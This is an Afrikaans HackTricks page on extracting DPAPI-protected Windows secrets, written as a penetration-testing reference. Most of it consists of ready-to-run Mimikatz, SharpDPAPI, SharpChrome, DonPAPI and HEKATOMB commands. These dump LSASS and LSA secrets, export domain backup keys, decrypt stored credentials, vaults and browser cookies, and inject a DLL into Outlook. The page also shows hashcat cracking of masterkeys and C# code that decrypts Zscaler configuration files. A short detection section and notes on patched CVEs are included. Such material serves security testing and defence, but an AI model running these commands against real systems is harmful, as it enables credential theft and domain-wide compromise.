# DPAPI - Uittrekking van wagwoorde

{{#include ../../banners/hacktricks-training.md}}



## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die Windows-bedryfstelsel gebruik vir die **simbetriese enkripsie van asymmetriese private sleutels**, deur óf gebruiker- óf stelselgeheime as 'n belangrike bron van entropie te gebruik. Hierdie benadering vereenvoudig enkripsie vir ontwikkelaars deur hulle in staat te stel om data te enkripteer met 'n sleutel wat afgelei is van die gebruiker se aanmeldgeheime of, vir stelsel-enkripsie, die stelsel se domeinauthentiseringgeheime, sodat ontwikkelaars nie self die beskerming van die enkripsiesleutel hoef te bestuur nie.

Die algemeenste manier om DPAPI te gebruik is deur die **`CryptProtectData` en `CryptUnprotectData`** funksies, wat toepassings in staat stel om data veilig te enkripteer en te ontsleutel met die sessie van die proses wat tans aangemeld is. Dit beteken dat die geënkripteerde data slegs deur dieselfde gebruiker of stelsel ontsleutel kan word wat dit geënkripteer het.

Verder aanvaar hierdie funksies ook 'n **`entropy` parameter** wat ook tydens enkripsie en ontsleuteling gebruik sal word; dus, om iets te ontsleutel wat met hierdie parameter geënkripteer is, moet jy dieselfde `entropy`-waarde verskaf wat tydens enkripsie gebruik is.

### Gebruiker-sleutelgenerering

Die DPAPI genereer 'n unieke sleutel (genoem **`pre-key`**) vir elke gebruiker gebaseer op hul geloofsbriewe. Hierdie sleutel word afgelei van die gebruiker se wagwoord en ander faktore en die algoritme hang af van die soort gebruiker maar eindig as 'n SHA1. Byvoorbeeld, vir domeingebruikers **hang dit af van die NTLM-hash van die gebruiker**.

Dit is veral interessant omdat as 'n aanvaller die gebruiker se wagwoord-hash kan bekom, hulle kan:

- **Ontsleutel enige data wat met DPAPI geënkripteer is** met daardie gebruiker se sleutel sonder om enige API te kontak
- Probeer om die **wagwoord offline te kraak** deur te probeer om die geldige DPAPI-sleutel te genereer

Boonop, elke keer wanneer 'n gebruiker data met DPAPI enkripteer, word 'n nuwe **master key** gegenereer. Hierdie master key is die een wat eintlik gebruik word om data te enkripteer. Elke master key kry 'n **GUID** wat dit identifiseer.

Die master sleutels word gestoor in die **%APPDATA%\Microsoft\Protect\<sid>\<guid>** gids, waar `{SID}` die Security Identifier van daardie gebruiker is. Die master key word gestoor versleuteld deur die gebruiker se **`pre-key`** en ook deur 'n **domain backup key** vir herstel (dus is dieselfde sleutel twee keer versleuteld deur twee verskillende sleutels).

Neem kennis dat die **domeinsleutel wat gebruik word om die master key te enkripteer op die domain controllers is en nooit verander nie**, so as 'n aanvaller toegang tot die domain controller het, kan hulle die domein-backup sleutel verkry en die master sleutels van alle gebruikers in die domein ontsleutel.

Die geënkripteerde blobs bevat die **GUID van die master key** wat gebruik is om die data binne hul headers te enkripteer.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Vind master sleutels:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Dit is hoe 'n klomp Master Keys van 'n gebruiker sal lyk:

![](<../../images/image (1121).png>)

### Machine/System sleutelgenerering

Dit is die sleutel wat deur die masjien gebruik word om data te enkripteer. Dit is gebaseer op die **DPAPI_SYSTEM LSA secret**, wat 'n spesiale sleutel is waartoe slegs die SYSTEM-gebruiker toegang het. Hierdie sleutel word gebruik om data te enkripteer wat deur die stelsel self beskikbaar moet wees, soos masjienvlak-inlogbesonderhede of stelselwye geheime.

Let daarop dat hierdie sleutels **nie 'n domein-rugsteun het nie**, dus is hulle slegs plaaslik toeganklik:

- **Mimikatz** kan daartoe toegang kry deur LSA-sekrete te dump met die opdrag: `mimikatz lsadump::secrets`
- Die geheim word in die register gestoor, so 'n administrateur kan **die DACL-permissies wysig om toegang daartoe te kry**. Die registerpad is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Data beskerm deur DPAPI

Onder die persoonlike data wat deur DPAPI beskerm word, is:

- Windows-aanmeldbewyse
- Internet Explorer- en Google Chrome-wagwoorde en outo-aanvuldata
- E-pos en interne FTP-rekeningwagwoorde vir toepassings soos Outlook en Windows Mail
- Wagwoorde vir gedeelde gidse, hulpbronne, draadlose netwerke, en Windows Vault, insluitend enkripsiesleutels
- Wagwoorde vir remote desktop-verbindinge, .NET Passport, en privaat sleutels vir verskeie enkripsie- en verifikasiedoeleindes
- Netwerkwagwoorde wat deur Credential Manager bestuur word en persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN Messenger, en meer
- Geënkripteerde blobs binne die register
- ...

Stelsel-beskermde data sluit in:
- Wi‑Fi-wagwoorde
- Wagwoorde vir geskeduleerde take
- ...

### Opsies vir Master key-uittrekking

- As die gebruiker domeinadmin-regte het, kan hulle toegang kry tot die **domein-rugsteunsleutel** om alle gebruiker Master keys in die domein te ontsleutel:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Met local admin privileges is dit moontlik om **access the LSASS memory** en sodoende die DPAPI master keys van al die gekoppelde gebruikers en die SYSTEM key uit te trek.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Indien die gebruiker local admin privileges het, kan hulle toegang kry tot die **DPAPI_SYSTEM LSA secret** om die machine master keys te ontsleutel:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- As die wagwoord of die NTLM-hash van die gebruiker bekend is, kan jy **die gebruiker se master-sleutels direk ontsleutel**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- As jy binne 'n sessie as die gebruiker is, is dit moontlik om die DC te vra vir die **backup key to decrypt the master keys using RPC**. As jy local admin is en die gebruiker aangemeld is, kan jy **steal his session token** hiervoor:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lys Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Toegang tot DPAPI-versleutelde data

### Vind DPAPI-versleutelde data

Gewone gebruikers se **beskermde lêers** is in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Kyk ook om `\Roaming\` na `\Local\` te verander in bogenoemde paaie.

Voorbeelde van enumerasie:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kan DPAPI-geënkripteerde blobs in die lêerstelsel, register en B64-blobs vind:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Let daarop dat [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (van dieselfde repo) gebruik kan word om sensitiewe data soos cookies wat met DPAPI versleut is, te dekripteer.

### Toegangssleutels en data

- **Gebruik SharpDPAPI** om credentials uit DPAPI-versleutelde lêers van die huidige sessie te kry:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kry credentials-inligting** soos die geënkripteerde data en die guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Toegang tot master-sleutels**:

Ontsleutel 'n master-sleutel van 'n gebruiker wat die **domein-rugsteun-sleutel** met behulp van RPC versoek:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Die **SharpDPAPI** hulpmiddel ondersteun ook hierdie argumente vir masterkey-ontsleuteling (let daarop hoe dit moontlik is om `/rpc` te gebruik om die domein se rugsteunsleutel te kry, `/password` om 'n platteks-wagwoord te gebruik, of `/pvk` om 'n DPAPI-domein privaat sleutel-lêer te spesifiseer...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dekripteer data met 'n masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Die **SharpDPAPI**-hulpmiddel ondersteun ook hierdie argumente vir `credentials|vaults|rdg|keepass|triage|blob|ps`-ontsleuteling (let daarop dat dit moontlik is om `/rpc` te gebruik om die domein se rugsteun-sleutel te kry, `/password` te gebruik vir 'n plat-tekst wagwoord, `/pvk` om 'n DPAPI-domein privaat-sleutel-lêer te spesifiseer, `/unprotect` om die huidige gebruiker se sessie te gebruik...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Ontsleutel sekere data met die **huidige gebruikersessie**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Hantering van Opsionele Entropy ("Third-party entropy")

Sommige toepassings gee 'n addisionele **entropy**-waarde aan `CryptProtectData`. Sonder hierdie waarde kan die blob nie ontsleutel word nie, selfs al is die korrekte masterkey bekend. Die verkryging van die entropy is dus noodsaaklik wanneer jy op credentials mik wat op hierdie wyse beskerm word (bv. Microsoft Outlook, sommige VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is 'n user-mode DLL wat die DPAPI funksies binne die teikenproses hook en deursigtig enige opsionele **entropy** wat verskaf word, registreer. Om EntropyCapture in **DLL-injection**-modus teen prosesse soos `outlook.exe` of `vpnclient.exe` te laat loop, sal 'n lêer uitvoer wat elke entropy-buffer aan die aanroepende proses en blob koppel. Die vasgelegde entropy kan later aan **SharpDPAPI** (`/entropy:`) of **Mimikatz** (`/entropy:<file>`) voorsien word om die data te ontsleutel.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys aflyn (Hashcat & DPAPISnoop)

Microsoft het 'n **context 3** masterkey-formaat geïntroduseer begin met Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) het hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) en **22102** (context 3) bygevoeg wat GPU-versnelde cracking van user passwords direk vanaf die masterkey-lêer moontlik maak. Aanvallers kan dus woordlys- of brute-force-aanvalle uitvoer sonder om met die teikenstelsel te kommunikeer.

`DPAPISnoop` (2024) automatiseer die proses:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Die tool kan ook Credential- en Vault-blobs ontleed, dit met gekraakte sleutels ontsleutel en cleartext passwords uitvoer.

### Toegang tot data van 'n ander masjien

In **SharpDPAPI and SharpChrome** kan jy die **`/server:HOST`** opsie aandui om toegang tot 'n afgeleë masjien se data te kry. Uiteraard moet jy daardie masjien kan bereik, en in die volgende voorbeeld word aanvaar dat die **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ander gereedskap

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is 'n hulpmiddel wat die onttrekking van alle gebruikers en rekenaars uit die LDAP-gids en die onttrekking van die domain controller backup key deur RPC outomatiseer. Die script sal dan al die rekenaars se IP-adresse oplos en 'n smbclient op al die rekenaars uitvoer om al die DPAPI blobs van alle gebruikers te kry en alles met die domein-rugsteunsleutel te ontsleutel.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met 'n uitgetrekte rekenaarlys uit LDAP kan jy elke subnetwerk vind, selfs al het jy nie daarvan geweet nie!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan geheime wat deur DPAPI beskerm word outomaties uithaal. Die 2.x vrystelling het die volgende ingesluit:

* Parallelle versameling van blobs vanaf honderde hosts
* Ontleding van **context 3** masterkeys en outomatiese Hashcat-krak-integrasie
* Ondersteuning vir Chrome "App-Bound" geïnkripteerde koekies (sien volgende afdeling)
* 'n nuwe **`--snapshot`**-modus om eindpunte herhaaldelik te peil en nuutgemaakte blobs te vergelyk

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) is 'n C#-parser vir masterkey/credential/vault-lêers wat Hashcat/JtR-formate kan uitset en opsioneel krakering outomaties kan aanroep. Dit ondersteun volledig masjien- en gebruiker-masterkey-formate tot Windows 11 24H1.


## Algemene deteksies

- Toegang tot lêers in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` en ander DPAPI-verwante direktoriewe.
- Veral vanaf 'n netwerkdeel soos **C$** of **ADMIN$**.
- Gebruik van **Mimikatz**, **SharpDPAPI** of soortgelyke gereedskap om toegang tot LSASS-geheue te kry of masterkeys te dump.
- Gebeurtenis **4662**: *An operation was performed on an object* – kan gekorreleer word met toegang tot die **`BCKUPKEY`**-objek.
- Gebeurtenis **4673/4674** wanneer 'n proses *SeTrustedCredManAccessPrivilege* aanvra (Credential Manager)

---
### 2023-2025 kwesbaarhede & ekosisteemveranderingen

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). 'n Aanvaller met netwerktoegang kon 'n domeinlid mislei om 'n kwaadwillige DPAPI-rugsteunsleutel te bekom, wat die ontsleuteling van gebruikers-masterkeys moontlik maak. Gepatch in die November 2023 kumulatiewe opdatering – administrateurs moet verseker dat DCs en werkstasies volledig gepatch is.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) het die legacy DPAPI-only beskerming vervang met 'n bykomende sleutel wat onder die gebruiker se **Credential Manager** gestoor word. Aflyn-ontsleuteling van koekies vereis nou beide die DPAPI masterkey en die **GCM-wrapped app-bound key**. SharpChrome v2.3 en DonPAPI 2.x kan die ekstra sleutel herstel wanneer hulle in gebruiker-konteks hardloop.


### Gevallestudie: Zscaler Client Connector – Aangepaste entropie afgelei van SID

Zscaler Client Connector berg verskeie konfigurasielêers onder `C:\ProgramData\Zscaler` (bv. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Elke lêer is met **DPAPI (Machine scope)** enkripteer, maar die verkoper voorsien **aangepaste entropie** wat *by runtime bereken* word in plaas daarvan om op skyf gestoor te word.

Die entropie word herbou uit twee elemente:

1. 'n vasgekodeerde geheim ingebed in `ZSACredentialProvider.dll`.
2. Die **SID** van die Windows-rekening waaraan die konfigurasie behoort.

Die algoritme wat deur die DLL geïmplementeer is, is ekwivalent aan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Omdat die geheim in 'n DLL ingebed is wat vanaf die skyf gelees kan word, **enige plaaslike aanvaller met SYSTEM rights kan die entropy vir enige SID hergenereer** en die blobs offline ontsleutel:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Ontsleuteling lewer die volledige JSON-konfigurasie, insluitend elke **device posture check** en die verwagte waarde daarvan – inligting wat baie waardevol is wanneer pogings tot client-side bypasses aangewend word.

> WENK: die ander versleutelde artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) word beskerm met DPAPI **sonder** entropie (`16` nul bytes). Hulle kan daarom direk gedekripteer word met `ProtectedData.Unprotect` sodra SYSTEM-privileges verkry is.

## Verwysings

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
